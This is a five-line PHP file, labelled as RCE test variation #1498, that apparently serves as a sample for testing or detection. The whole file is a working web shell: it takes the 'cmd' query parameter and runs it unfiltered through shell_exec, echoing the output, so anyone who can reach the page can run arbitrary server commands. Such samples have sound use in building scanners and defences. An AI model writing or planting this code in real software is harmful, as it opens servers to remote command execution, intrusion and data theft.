<?php
// RCE test variation #1498
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>